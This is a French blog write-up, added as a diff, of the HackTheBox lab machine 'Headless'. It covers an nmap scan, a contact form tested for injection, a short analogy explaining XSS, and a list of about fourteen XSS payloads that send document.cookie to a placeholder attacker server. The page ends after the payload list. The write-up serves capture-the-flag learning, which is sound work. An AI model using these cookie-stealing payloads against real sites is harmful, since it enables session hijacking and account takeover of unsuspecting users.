@@ -1,0 +1,534 @@
+<!doctype html>
+<html lang="fr-fr" class="no-js">
+
+  <head>
+    <link href="http://gmpg.org/xfn/11" rel="profile" hreflang="fr">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  
+    <meta name="google-site-verification" content="JeRPv2CEcpONAy8C7dMr1nzjlpZxlxYCtt2PnuQ78g8" />
+    <!-- Enable responsiveness on mobile devices-->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  
+    <title>
+      
+        Headless - Lukas
+      
+    </title>
+
+	<link rel="stylesheet" href="/assets/css/style.css?v=1.13"> <!-- Resource style -->
+    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Signika:600"> <!-- Logo font -->
+    <script src="/assets/js/modernizr.js"></script> <!-- Modernizr -->
+    
+    <link rel="apple-touch-icon" sizes="57x57" href="/assets/icones/favicon/apple-icon-57x57.png">
+    <link rel="apple-touch-icon" sizes="60x60" href="/assets/icones/favicon/apple-icon-60x60.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="/assets/icones/favicon/apple-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="/assets/icones/favicon/apple-icon-76x76.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="/assets/icones/favicon/apple-icon-114x114.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="/assets/icones/favicon/apple-icon-120x120.png">
+    <link rel="apple-touch-icon" sizes="144x144" href="/assets/icones/favicon/apple-icon-144x144.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="/assets/icones/favicon/apple-icon-152x152.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/icones/favicon/apple-icon-180x180.png">
+    <link rel="icon" type="image/png" sizes="192x192"  href="/assets/icones/favicon/android-icon-192x192.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/assets/icones/favicon/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="96x96" href="/assets/icones/favicon/favicon-96x96.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/assets/icones/favicon/favicon-16x16.png">
+    
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="/assets/icones/favicon/ms-icon-144x144.png">
+    <meta name="theme-color" content="#ffffff">
+  	
+	<!-- RSS -->
+    <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Lukas" />
+
+    <!-- Twitter card -->
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="@lukastaboga" />
+    <meta name="twitter:creator" content="@lukastaboga" />
+    <meta name="twitter:title" content="Headless" />
+    <meta name="twitter:description" content="Un aperçu détaillé sur le concept de systèmes headless." />
+    
+    <meta name="twitter:image" content="http://localhost:4000/assets/uploads/2024/2024-htb-headless/image_htbHeadless.webp" />
+    
+
+    
+      
+    
+	<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-DNP6NC70FV"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-DNP6NC70FV');
+</script>
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Headless" />
+<meta name="author" content="Lukas" />
+<meta property="og:locale" content="fr_FR" />
+<meta name="description" content="Un aperçu détaillé sur le concept de systèmes headless." />
+<meta property="og:description" content="Un aperçu détaillé sur le concept de systèmes headless." />
+<link rel="canonical" href="http://localhost:4000/headless/" />
+<meta property="og:url" content="http://localhost:4000/headless/" />
+<meta property="og:site_name" content="Lukas" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-03-26T01:00:00+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Headless" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Lukas"},"dateModified":"2024-03-26T01:00:00+01:00","datePublished":"2024-03-26T01:00:00+01:00","description":"Un aperçu détaillé sur le concept de systèmes headless.","headline":"Headless","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/headless/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/icones/avatar.png"},"name":"Lukas"},"url":"http://localhost:4000/headless/"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+
+  <body>
+    <header class="cd-main-header">
+    <a href="/" class="cd-logo"><img src="/assets/icones/logo.png" alt="hackndo logo" /> <span class="cd-logo-title">hello</span></a>
+		
+    <a href="#0" class="cd-nav-trigger">Menu<span></span></a>
+
+</header> <!-- .cd-main-header -->
+    <main class="cd-main-content">
+		<nav class="cd-side-nav">
+            <div class="sidebar-about">
+    <h1>
+        <img id="site-logo" src="/assets/icones/avatar.png" alt="hackndo logo" title="logo" />
+        <a class="sidebar-title" href="/">
+        Lukas
+        </a>
+    </h1>
+    <p class="lead">out of the box</p>
+</div>
+
+<ul>
+    <li class="cd-label">Blog</li>
+    <li class="">
+        <a href="/">Home</a>
+    </li>
+    
+    
+        
+            
+        
+    
+        
+            
+                <li class="">
+                    <a href="/about/">À propos</a>
+                </li>
+            
+        
+    
+        
+            
+                <li class="">
+                    <a href="/archives/">Archives</a>
+                </li>
+            
+        
+    
+        
+            
+                <li class="">
+                    <a href="/contact/">Me contacter</a>
+                </li>
+            
+        
+    
+        
+            
+                <li class="">
+                    <a href="/disclaimer/">Disclaimer</a>
+                </li>
+            
+        
+    
+        
+    
+        
+            
+        
+    
+        
+            
+                <li class="">
+                    <a href="/projects/">Projets</a>
+                </li>
+            
+        
+    
+        
+    
+        
+            
+                <li class="">
+                    <a href="/trophies/">Trophées/Certifications</a>
+                </li>
+            
+        
+    
+        
+    
+</ul>
+<div class="sidebar-social">
+<ul>
+  <li><a href="https://x.com/lukastaboga" title="Twitter" target="_blank"><img alt="Twitter" title="Twitter" src="/assets/icones/social/twitter.png" /></a></li>
+  <li><a href="https://github.com/ticodevv" title="Github" target="_blank"><img title="Github" alt="Github" src="/assets/icones/social/github.png" /></a></li>
+  <li><a href="https://www.linkedin.com/in/lukas-taboga-5a8040237/" title="LinkedIn" target="_blank"><img title="LinkedIn" alt="LinkedIn" src="/assets/icones/social/linkedin.png" /></a></li>
+</ul>
+</div>
+<p class="sidebar-copyright">&copy; 2024. Tous droits réservés.</p>
+
+        </nav>
+
+        <div class="content-wrapper">
+            
+              
+                
+              
+                
+              
+                
+              
+                
+              
+                
+              
+                
+                  
+                
+              
+                
+              
+                
+              
+            
+            <div class="post">
+  
+  <div class="post-cover">
+    <img src="/assets/uploads/2024/2024-htb-headless/image_htbHeadless.webp" alt="Headless" title="Headless" />
+  </div>
+  
+  <h1 class="post-title">Headless</h1>
+  <div class="post-info">
+    
+    <p class="alignleft">26 Mar 2024 · 12 min</p>
+    <p class="alignright">Auteur : <strong><a href="https://twitter.com/HackAndDo">Lukas</a></strong></p>
+      <div class="keywords">
+        <span class="post-tags"><a href="/archives/#hackthebox"><i class="fas fa-tags"></i> HackTheBox</a><a href="/archives/#web"><i class="fas fa-tags"></i> Web</a><a href="/archives/#xss"><i class="fas fa-tags"></i> XSS</a></span>
+      </div>
+</div>
+
+  <article>
+  <p>Bonjour à tous ! Aujourd’hui, je vous présente la machine Headless classée dans la catégorie easy sur HackTheBox. Nous y aborderons des concepts de base dans le domaine du web. 🙃</p>
+
+<!--more-->
+
+<h2 id="port-scanning">Port Scanning</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Mar 26, 2024 - 09:34:43 <span class="o">(</span>CET<span class="o">)]</span> exegol-htb Headless: nmap <span class="nt">-sV</span> 10.10.11.8
+Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-03-26 09:34 CET
+Nmap scan report <span class="k">for </span>headless.htb <span class="o">(</span>10.10.11.8<span class="o">)</span>
+Host is up <span class="o">(</span>0.025s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 995 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT      STATE    SERVICE VERSION
+22/tcp    open     ssh     OpenSSH 9.2p1 Debian 2+deb12u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+787/tcp   filtered qsc
+5000/tcp  open     upnp?
+8085/tcp  filtered unknown
+16000/tcp filtered fmsas
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port5000-TCP:V<span class="o">=</span>7.93%I<span class="o">=</span>7%D<span class="o">=</span>3/26%Time<span class="o">=</span>660288BB%P<span class="o">=</span>aarch64-unknown-linux-gn
+SF:u%r<span class="o">(</span>GetRequest,BE1,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20200</span><span class="se">\x</span><span class="s2">20OK</span><span class="se">\r\n</span><span class="s2">Server:</span><span class="se">\x</span><span class="s2">20Werkzeug/2</span><span class="se">\.</span><span class="s2">2</span><span class="se">\</span><span class="s2">
+SF:.2</span><span class="se">\x</span><span class="s2">20Python/3</span><span class="se">\.</span><span class="s2">11</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20Tue,</span><span class="se">\x</span><span class="s2">2026</span><span class="se">\x</span><span class="s2">20Mar</span><span class="se">\x</span><span class="s2">202024</span><span class="se">\x</span><span class="s2">2008:35:07
+SF:</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20text/html;</span><span class="se">\x</span><span class="s2">20charset=utf-8</span><span class="se">\r\n</span><span class="s2">Content-Leng
+SF:th:</span><span class="se">\x</span><span class="s2">202799</span><span class="se">\r\n</span><span class="s2">Set-Cookie:</span><span class="se">\x</span><span class="s2">20is_admin=InVzZXIi</span><span class="se">\.</span><span class="s2">uAlmXlTvm8vyihjNaPDWnv
+SF:B_Zfs;</span><span class="se">\x</span><span class="s2">20Path=/</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n\r\n</span><span class="s2">&lt;!DOCTYPE</span><span class="se">\x</span><span class="s2">20html&gt;</span><span class="se">\n</span><span class="s2">&lt;ht
+SF:ml</span><span class="se">\x</span><span class="s2">20lang=</span><span class="se">\"</span><span class="s2">en</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&lt;head&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;meta</span><span class="se">\x</span><span class="s2">20charset=</span><span class="se">\"</span><span class="s2">UTF-8</span><span class="se">\"</span><span class="s2">&gt;
+SF:</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;meta</span><span class="se">\x</span><span class="s2">20name=</span><span class="se">\"</span><span class="s2">viewport</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"</span><span class="s2">width=device-
+SF:width,</span><span class="se">\x</span><span class="s2">20initial-scale=1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;title&gt;Under</span><span class="se">\x</span><span class="s2">20Constr
+SF:uction&lt;/title&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;style&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">
+SF:20body</span><span class="se">\x</span><span class="s2">20{</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20font-famil
+SF:y:</span><span class="se">\x</span><span class="s2">20'Arial',</span><span class="se">\x</span><span class="s2">20sans-serif;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20
+SF:</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20background-color:</span><span class="se">\x</span><span class="s2">20#f7f7f7;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20
+SF:</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20margin:</span><span class="se">\x</span><span class="s2">200;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20
+SF:</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20padding:</span><span class="se">\x</span><span class="s2">200;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">2
+SF:0display:</span><span class="se">\x</span><span class="s2">20flex;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20jus
+SF:tify-content:</span><span class="se">\x</span><span class="s2">20center;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\</span><span class="s2">
+SF:x20align-items:</span><span class="se">\x</span><span class="s2">20center;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">2
+SF:0</span><span class="se">\x</span><span class="s2">20height:</span><span class="se">\x</span><span class="s2">20100vh;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20}</span><span class="se">\n\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">
+SF:20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\.</span><span class="s2">container</span><span class="se">\x</span><span class="s2">20{</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">2
+SF:0</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20text-align:</span><span class="se">\x</span><span class="s2">20center;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">
+SF:20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20background-color:</span><span class="se">\x</span><span class="s2">20#fff;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\</span><span class="s2">
+SF:x20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20border-radius:</span><span class="se">\x</span><span class="s2">2010px;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">2
+SF:0</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20box-shadow:</span><span class="se">\x</span><span class="s2">200px</span><span class="se">\x</span><span class="s2">200px</span><span class="se">\x</span><span class="s2">2020px</span><span class="se">\x</span><span class="s2">20rgba</span><span class="se">\(</span><span class="s2">0,</span><span class="se">\</span><span class="s2">
+SF:x200,</span><span class="se">\x</span><span class="s2">200,</span><span class="se">\x</span><span class="s2">200</span><span class="se">\.</span><span class="s2">2</span><span class="se">\)</span><span class="s2">;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20"</span><span class="o">)</span>%r<span class="o">(</span>RTSPRequest,16C,<span class="s2">"&lt;!DOC
+SF:TYPE</span><span class="se">\x</span><span class="s2">20HTML&gt;</span><span class="se">\n</span><span class="s2">&lt;html</span><span class="se">\x</span><span class="s2">20lang=</span><span class="se">\"</span><span class="s2">en</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;head&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\</span><span class="s2">
+SF:x20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;meta</span><span class="se">\x</span><span class="s2">20charset=</span><span class="se">\"</span><span class="s2">utf-8</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">2
+SF:0</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;title&gt;Error</span><span class="se">\x</span><span class="s2">20response&lt;/title&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;/head&gt;</span><span class="se">\</span><span class="s2">
+SF:n</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;body&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;h1&gt;Error</span><span class="se">\x</span><span class="s2">20r
+SF:esponse&lt;/h1&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;p&gt;Error</span><span class="se">\x</span><span class="s2">20code:</span><span class="se">\x</span><span class="s2">20400&lt;
+SF:/p&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;p&gt;Message:</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20request</span><span class="se">\x</span><span class="s2">20v
+SF:ersion</span><span class="se">\x</span><span class="s2">20</span><span class="se">\(</span><span class="s2">'RTSP/1</span><span class="se">\.</span><span class="s2">0'</span><span class="se">\)\.</span><span class="s2">&lt;/p&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;p&gt;Err
+SF:or</span><span class="se">\x</span><span class="s2">20code</span><span class="se">\x</span><span class="s2">20explanation:</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20-</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20request</span><span class="se">\x</span><span class="s2">20syntax</span><span class="se">\x</span><span class="s2">20o
+SF:r</span><span class="se">\x</span><span class="s2">20unsupported</span><span class="se">\x</span><span class="s2">20method</span><span class="se">\.</span><span class="s2">&lt;/p&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;/body&gt;</span><span class="se">\n</span><span class="s2">&lt;/html&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+<p>Le serveur distant hôte 2 services ouverts :</p>
+
+<ul>
+  <li>SSH server (OpenSSH 9.2p1)</li>
+  <li>HTTP server (upnp?)</li>
+</ul>
+
+<h2 id="web-enumeration">Web Enumeration</h2>
+
+<p>sur cette page web on peut y voir (Welcome to Our Website) avec un encadré bleu avec écrit (For Questions)</p>
+
+<p><img src="../assets/uploads/2024/2024-htb-headless/a.png" alt="screen_web.." /></p>
+
+<p>Cliquer sur le bouton puis nous accédons à une nouvelle page.</p>
+
+<p><img src="../assets/uploads/2024/2024-htb-headless/b.png" alt="screen_web.." /></p>
+
+<p>On peut y voir un formulaire de contact avec un champ de texte et un bouton submit.
+Remplissons le champ de texte avec une commande de base pour voir si il y a une faille d’injection.</p>
+
+<h2 id="web-exploitation">Web Exploitation</h2>
+
+<p><img src="../assets/uploads/2024/2024-htb-headless/c.png" alt="screen_web.." /></p>
+
+<p>Nous allons faire une faire une attaque xss.</p>
+
+<p>Mais avant tout c’est quoi une XSS :
+Imaginez un délicieux gâteau au chocolat, mais avec un ingrédient surprise caché à l’intérieur - du piment !</p>
+
+<p>L’attaque XSS est un peu comme ça. Un individu malveillant glisse du code malveillant (le piment) dans un site web qui semble normal.  Quand on visite le site (on mange le gâteau), notre navigateur exécute ce code sans méfiance, et paf!  Nos informations peuvent être volées ou on peut être redirigé vers un faux site (comme si on avait mal au ventre à cause du piment).</p>
+
+<p>Il existe deux façons courantes de cacher le piment :</p>
+
+<p>XSS réfléchi : L’individu malveillant envoie un lien piégé. Quand on clique dessus, le code malveillant est renvoyé par le site et exécuté par notre navigateur.</p>
+
+<p>XSS stocké : L’individu malveillant injecte le code directement dans le site web, affectant tous les visiteurs.</p>
+
+<p><img src="../assets/uploads/2024/2024-htb-headless/xss.webp" alt="img_xss" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;img <span class="nv">src</span><span class="o">=</span>x <span class="nv">onerror</span><span class="o">=</span>this.src<span class="o">=</span><span class="s2">"http://&lt;YOUR_SERVER_IP&gt;/?c="</span>+document.cookie&gt;
+&lt;img <span class="nv">src</span><span class="o">=</span>x <span class="nv">onerror</span><span class="o">=</span><span class="s2">"location.href='http://&lt;YOUR_SERVER_IP&gt;/?c='+ document.cookie"</span><span class="o">&gt;</span>
+&lt;script&gt;new Image<span class="o">()</span>.src<span class="o">=</span><span class="s2">"http://&lt;IP&gt;/?c="</span>+encodeURI<span class="o">(</span>document.cookie<span class="o">)</span><span class="p">;</span>&lt;/script&gt;
+&lt;script&gt;new Audio<span class="o">()</span>.src<span class="o">=</span><span class="s2">"http://&lt;IP&gt;/?c="</span>+escape<span class="o">(</span>document.cookie<span class="o">)</span><span class="p">;</span>&lt;/script&gt;
+&lt;script&gt;location.href <span class="o">=</span> <span class="s1">'http://&lt;YOUR_SERVER_IP&gt;/Stealer.php?cookie='</span>+document.cookie&lt;/script&gt;
+&lt;script&gt;location <span class="o">=</span> <span class="s1">'http://&lt;YOUR_SERVER_IP&gt;/Stealer.php?cookie='</span>+document.cookie&lt;/script&gt;
+&lt;script&gt;document.location <span class="o">=</span> <span class="s1">'http://&lt;YOUR_SERVER_IP&gt;/Stealer.php?cookie='</span>+document.cookie&lt;/script&gt;
+&lt;script&gt;document.location.href <span class="o">=</span> <span class="s1">'http://&lt;YOUR_SERVER_IP&gt;/Stealer.php?cookie='</span>+document.cookie&lt;/script&gt;
+&lt;script&gt;document.write<span class="o">(</span><span class="s1">'&lt;img src="http://&lt;YOUR_SERVER_IP&gt;?c='</span>+document.cookie+<span class="s1">'" /&gt;'</span><span class="o">)</span>&lt;/script&gt;
+&lt;script&gt;window.location.assign<span class="o">(</span><span class="s1">'http://&lt;YOUR_SERVER_IP&gt;/Stealer.php?cookie='</span>+document.cookie<span class="o">)</span>&lt;/script&gt;
+&lt;script&gt;window[<span class="s1">'location'</span><span class="o">][</span><span class="s1">'assign'</span><span class="o">](</span><span class="s1">'http://&lt;YOUR_SERVER_IP&gt;/Stealer.php?cookie='</span>+document.cookie<span class="o">)</span>&lt;/script&gt;
+&lt;script&gt;window[<span class="s1">'location'</span><span class="o">][</span><span class="s1">'href'</span><span class="o">](</span><span class="s1">'http://&lt;YOUR_SERVER_IP&gt;/Stealer.php?cookie='</span>+document.cookie<span class="o">)</span>&lt;/script&gt;
+&lt;script&gt;document.location<span class="o">=[</span><span class="s2">"http://&lt;YOUR_SERVER_IP&gt;?c"</span>,document.cookie].join<span class="o">()</span>&lt;/script&gt;
+&lt;script&gt;var <span class="nv">i</span><span class="o">=</span>new Image<span class="o">()</span><span class="p">;</span>i.src<span class="o">=</span><span class="s2">"http://&lt;YOUR_SERVER_IP&gt;/?c="</span>+document.cookie&lt;/script&gt;
